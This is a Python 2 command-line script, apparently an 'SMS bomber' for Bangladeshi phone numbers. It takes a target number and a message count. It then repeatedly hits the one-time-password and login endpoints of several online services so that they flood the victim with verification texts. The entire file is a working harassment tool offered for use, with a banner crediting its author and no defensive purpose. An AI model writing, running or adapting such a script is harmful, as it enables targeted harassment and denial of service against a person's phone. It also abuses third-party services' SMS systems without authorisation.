#!/usr/bin/python2
# -*- coding: utf-8 -*-
import requests,os,sys,time
logo = """

\033[1;92m███╗░░██╗\033[1;93m░░░░░░░\033[1;31m██████╗███╗░░░███╗░██████╗
\033[1;92m████╗░██║\033[1;93m░░░░░░\033[1;31m██╔════╝████╗░████║██╔════╝
\033[1;92m██╔██╗██\033[1;93m║█████╗\033[1;31m╚█████╗░██╔████╔██║╚█████╗░
\033[1;92m██║╚████║\033[1;93m╚════╝░\033[1;31m╚═══██╗██║╚██╔╝██║░╚═══██╗
\033[1;92m██║░╚███║\033[1;93m░░░░░░\033[1;31m██████╔╝██║░╚═╝░██║██████╔╝
\033[1;92m╚═╝░░╚══╝\033[1;93m░░░░░░╚═════╝░\033[1;31m╚═╝░░░░░╚═╝╚═════╝░
\033[1;37m
\033[1;31m---------------------------------------
\033[1;35mCREATED BY : \033[33mN4BIL-R4HM4N
\033[1;35mGITHUB     : \033[1;33mgithub.com/Nabil-Official
\033[1;35mFACEBOOK   : \033[1;33mnabil.404
\033[1;35mVERSION    : \033[1;33m1.1.1
\033[1;31m---------------------------------------
"""

def sms_bombing():
    os.system('clear')
    print logo
    print ""
    number= raw_input("\033[1;33m[+]\033[1;32m ENTER NUMBER \033[1;31m(Without +880) \033[1;32m: \033[1;36m")
    print ""
    limit= input("\033[1;33m[+]\033[1;32m ENTER SMS LIMIT : \033[1;36m")
    print ""
    print "\033[1;31m[~] \033[1;33mSOON \033[1;32m"+str(limit)+" \033[1;33mMSG WILL BE SEND \033[1;31m[~]"
    
    api="https://stage.bioscopelive.com/en/login/send-otp?phone=880"+number+"&operator=bd-otp"   
    data = {
            'phone_number': '+880'+number
          }
          
    from requests.structures import CaseInsensitiveDict
    
    url = "https://api.bdtickets.com:20100/v1/auth"

    headers = CaseInsensitiveDict()
    headers["Content-Type"] = "application/json"
    data = "{\"phoneNumber\":\"+880" + number + "\"}"
          
    for sms in range(limit):
        resp = requests.post(url, headers=headers, data=data)
        requests.get(api)
        respnse = requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json=data)
        data={"query":"\nmutation CreateOtp (\n    $phone: PhoneNumber!\n    $country: String!\n    $uuid: String!\n    $osVersionCode: String\n    $deviceBrand: String\n    $deviceModel: String\n    $requestFrom: String\n) {\n    createOtp(\n        auth: {\n            phone: $phone,\n            countryCode: $country,\n            deviceUuid: $uuid,\n            deviceToken: \"\"\n        }\n        device: {\n            deviceType: WEB\n            osVersionCode: $osVersionCode\n            deviceBrand: $deviceBrand\n            deviceModel: $deviceModel\n        }\n        requestFrom: $requestFrom\n    ){\n        statusCode\n    }\n}\n","variables":{"phone":number,"country":"880","uuid":"64b9bb81-93f3-4757-9e92-9cfbf34d8039","osVersionCode":"Linux armv8l","deviceBrand":"Chrome","deviceModel":"89","requestFrom":"U2FsdGVkX18QITR3WakOCR2OK+zoIpqM7DqxiLf915s="}}
  
        res=requests.post("https://api-v4-2.hungrynaki.com/graphql", json=data)
        sms_limit = str(sms+1)
        print ""
        print "\033[1;31m--------------------------"
        print (str(sms_limit)+" SMS SEND SUCCESFUL")
        print "\033[1;31m--------------------------"
        if sms_limit == limit:
           os.system('xdg-open https://m.facebook.com/nabil.404')
def intro():
    os.system('clear')
    print logo
    print ""
    print ("\033[1;31m[1] \033[1;32mSTART BOMBING \033[1;31m(Only For Bangladesh) ")
    print ("\033[1;31m[2] \033[1;32mHELP ")
    print ("\033[1;31m[3] \033[1;32mEXIT ")
    print ""
    user_choise = raw_input("\033[1;34mN4BIL \033[1;31m>>  ")
    if user_choise == "1":
       sms_bombing()
    elif user_choise == "2":
         os.system('xdg-open https://m.facebook.com/nabil.404')
         os.system('xdg-open https://m.facebook.com/nabil.404')
    elif user_choise == "3":
         os.system('clear')
         print ('Thanks For Using :)')
         
    else:
       print ('INVILED CHOISE ! ')
     
intro()
